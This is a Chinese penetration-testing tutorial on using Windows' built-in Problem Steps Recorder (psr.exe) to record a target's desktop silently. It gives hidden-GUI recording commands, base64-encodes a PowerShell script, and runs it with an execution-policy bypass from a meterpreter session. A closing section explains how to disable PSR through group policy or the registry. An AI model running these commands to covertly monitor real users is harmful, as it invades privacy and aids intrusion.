# 渗透技巧——如何巧妙利用PSR监控Windows桌面

0x00 前言
=======

* * *

在渗透测试的过程中，如果需要获取主机的更多信息，相比于键盘记录，记录系统屏幕的操作往往更加直接有效。  
也许每个人都有自己独特的实现方式，但是如果能够利用Windows系统自带的程序实现，个人认为绝对是最优先考虑的方案。  
下面就介绍一下如何利用Windows系统自带的功能实现监控屏幕操作。

![Alt text](http://drops.javaweb.org/uploads/images/1da445f743ee6c87211f49af8467fcc51d7b7097.jpg)

0x01 简介
=======

* * *

**PSR**（Problem Steps Recorder），直译为问题步骤记录器，在Windows 早期的系统中，采用**WER**（Windows Error Reporting）来收集系统的错误报告，但这些报告往往包含的信息太少以致于无法解决实际问题。

为此，微软从Windows 7系统开始，增加了PSR来解决这个问题，PSR能够记录用户在遇到崩溃时执行的所有操作，以便测试人员和开发人员能够重现环境对其分析和调试。

当PSR运行时，将会自动记录屏幕的操作，每次操作都会自动保存成一张图片，最终生成一份zip格式的报告。

**注：**  
百度百科对psr的名称描述有误，准确的应为Problem Steps Recorder（该问题已提交）

如图![Alt text](http://drops.javaweb.org/uploads/images/38d444b3a2837418f1652683822f2cc500e438f3.jpg)

链接为：  
[http://baike.baidu.com/link?url=BCQtF6gpxNGulRPj-vACw_NGwZvHPcrfvn4vmx6u_JFI_OcuPJIFzY3GYE-mu91DZcB-RLiQ6pGXTki1Fc0Y6K](http://baike.baidu.com/link?url=BCQtF6gpxNGulRPj-vACw_NGwZvHPcrfvn4vmx6u_JFI_OcuPJIFzY3GYE-mu91DZcB-RLiQ6pGXTki1Fc0Y6K)

0x02 使用方法
=========

* * *

### 1、启动psr.exe，点击开始录制

可使用快捷键win+R直接输入psr来启动  
下图为psr的操作面板，点击开始记录即可记录当前的屏幕操作

![Alt text](http://drops.javaweb.org/uploads/images/f16ff80fb532ec9dc812782d189ddd173914debf.jpg)

点击后会提示权限的问题，如果需要记录管理员权限的程序，那么需要以管理员权限来运行psr，如图

![Alt text](http://drops.javaweb.org/uploads/images/b780a85358a1a54d1917d50285130f8f2f1b5149.jpg)

### 2、进行任意操作

当运行psr开始录制后，鼠标点击时会增加特效

如图![Alt text](http://drops.javaweb.org/uploads/images/bc2894470ea0bd80cff38ee259dca071cc79af1a.jpg)

### 3、停止记录，保存报告

如图![Alt text](http://drops.javaweb.org/uploads/images/aeb39001b0d39f85209d2f3f2bbab10305b5c22a.jpg)

### 4、查看报告

报告会对每次操作截图，并记录鼠标的操作

比如鼠标的单击操作，从截图注释可以看到当前的鼠标做了哪些操作![Alt text](http://drops.javaweb.org/uploads/images/08eeec6ef2124bebe966dedbaa6a4f258dd14325.jpg)

而且，在报告后半部分会详细记录相关细节，里面的内容也很是有趣：![Alt text](http://drops.javaweb.org/uploads/images/a0536de0deef19d7d0043e363980dfec0a664d75.jpg)

0x03 进阶方法
=========

* * *

psr在记录屏幕的操作中会启动UI界面，并且对鼠标点击操作增加特效，这显然无法满足渗透测试的要求。

但好在psr提供了命令行参数用作后台记录

命令行参数如下：

```
psr.exe [/start |/stop][/output <fullfilepath>] [/sc (0|1)] [/maxsc <value>]
[/sketch (0|1)] [/slides (0|1)] [/gui (0|1)]
[/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)]
[/stopevent <eventname>] [/maxlogsize <value>] [/recordpid <pid>]

/start Start Recording. (Outputpath flag SHOULD be specified)
/stop Stop Recording.
/sc Capture screenshots for recorded steps.
/maxsc Maximum number of recent screen captures.
/maxlogsize Maximum log file size (in MB) before wrapping occurs.
/gui Display control GUI.
/arcetl Include raw ETW file in archive output.
/arcxml Include MHT file in archive output.
/recordpid Record all actions associated with given PID.
/sketch Sketch UI if no screenshot was saved.
/slides Create slide show HTML pages.
/output Store output of record session in given path.
/stopevent Event to signal after output files are generated.

```

结合实际，可使用以下命令：

1.  `psr.exe /start /gui 0 /output C:\test\capture.zip`
    
    后台启动psr并开始录制，文件保存为C:\test\capture.zip
    
2.  `psr.exe /stop`
    
    结束录制并退出psr，自动保存报告文件
    

0x04 实际测试
=========

* * *

**测试环境：**

```
Server：
OS：Kali linux
IP：192.168.174.133

Client：
OS:Win7 x86
IP:192.168.174.128

Kali已获得meterpreter权限

```

如图![Alt text](http://drops.javaweb.org/uploads/images/1de30e3a29f712f8a32b78de273151663d63d824.jpg)

**测试功能：**

1.  自动启动录制
2.  录制指定时间后自动退出
3.  自动保存报告文件

可使用Powershell对上述功能做简单实现：

**1、**启动自动录制，设置为无界面模式，并指定输出路径：

```
psr.exe /start /gui 0 /output C:\test\capture.zip;

```

**2、**等待10s，即录制时间为10s：

```
Start-Sleep -s 10;

```

**3、**结束录制，自动退出：

```
psr.exe /stop;

```

可将以上代码保存为`C:\test\1.txt`，然后对其作base64加密

在Powershell环境下执行如下代码来对功能代码进行base64加密：

```
$string=Get-Content "C:\test\1.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded

```

![Alt text](http://drops.javaweb.org/uploads/images/018fbcfa73334af91e809fff581a3326ed9c8942.jpg)

如图，从输出得到加密的Powershell命令为：

```
cABzAHIALgBlAHgAZQAgAC8AcwB0AGEAcgB0ACAALwBnAHUAaQAgADAAIAAvAG8AdQB0AHAAdQB0ACAAQwA6AFwAdABlAHMAdABcAGMAYQBwAHQAdQByAGUALgB6AGkAcAA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADsAIABwAHMAcgAuAGUAeABlACAALwBzAHQAbwBwADsA

```

然后就可以在meterpreter的shell下直接执行Powershell命令：

```
powershell -ep bypass -enc cABzAHIALgBlAHgAZQAgAC8AcwB0AGEAcgB0ACAALwBnAHUAaQAgADAAIAAvAG8AdQB0AHAAdQB0ACAAQwA6AFwAdABlAHMAdABcAGMAYQBwAHQAdQByAGUALgB6AGkAcAA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADsAIABwAHMAcgAuAGUAeABlACAALwBzAHQAbwBwADsA

```

![Alt text](http://drops.javaweb.org/uploads/images/666887c8d907395736f274b2b90dacf0608d527e.jpg)

代码执行后，等待10s产成报告文件capture.zip，测试成功

0x05 防御
=======

* * *

可采用以下两种方法关闭psr：

### 1、使用组策略

**中文系统：**

gpedit.msc-管理模板-Windows组件-应用程序兼容性

启用关闭问题步骤记录器

如图![Alt text](http://drops.javaweb.org/uploads/images/0b55365ddfaf67bf4f45e11fe2af5755e52df435.jpg)

**英文系统：**

gpedit.msc-Computer Configuration-Administrative Templates-Windows Components-Application Compatibility

启用Turn off Problem Steps Recorder

如图![Alt text](http://drops.javaweb.org/uploads/images/e7bfabd84462e911ce7eb894518205919116ef38.jpg)

### 2、修改注册表

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat]

```

新建`"DisableUAR"=dword:00000001`

如图![Alt text](http://drops.javaweb.org/uploads/images/5b1e9ddcdf797ede7bbb42e158d3b61820508d92.jpg)

**注：**  
dword=1对应组策略中的已启用  
dword=0对应组策略中的已禁用  
删除"DisableUAR"对应组策略中的未配置

0x06 小结
=======

* * *

利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，一定会用上它。

0x07 参考资料
=========

* * *

*   [https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/](https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/)
*   [https://msdn.microsoft.com/en-us/library/windows/desktop/dd371782(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/dd371782(v=vs.85).aspx)
*   [https://blogs.msdn.microsoft.com/cjacks/2009/02/25/deciphering-the-command-line-configuration-of-the-windows-7-problem-steps-recorder/](https://blogs.msdn.microsoft.com/cjacks/2009/02/25/deciphering-the-command-line-configuration-of-the-windows-7-problem-steps-recorder/)
*   [https://technet.microsoft.com/en-us/magazine/dd464813.aspx](https://technet.microsoft.com/en-us/magazine/dd464813.aspx)
*   [http://blogs.msdn.com/b/wer/archive/2009/03/30/problem-steps-recorder-psr-exe-windows-error-reporting-another-tool-to-help-find-solutions-to-software-defects.aspx](http://blogs.msdn.com/b/wer/archive/2009/03/30/problem-steps-recorder-psr-exe-windows-error-reporting-another-tool-to-help-find-solutions-to-software-defects.aspx)
*   [http://blogs.technet.com/b/mspfe/archive/2013/03/22/uncovering-a-hidden-gem-psr-exe.aspx](http://blogs.technet.com/b/mspfe/archive/2013/03/22/uncovering-a-hidden-gem-psr-exe.aspx)
*   [http://www.sevenforums.com/tutorials/139779-problem-steps-recorder-enable-disable.html](http://www.sevenforums.com/tutorials/139779-problem-steps-recorder-enable-disable.html)

**本文由三好学生原创并首发于乌云drops，转载请注明**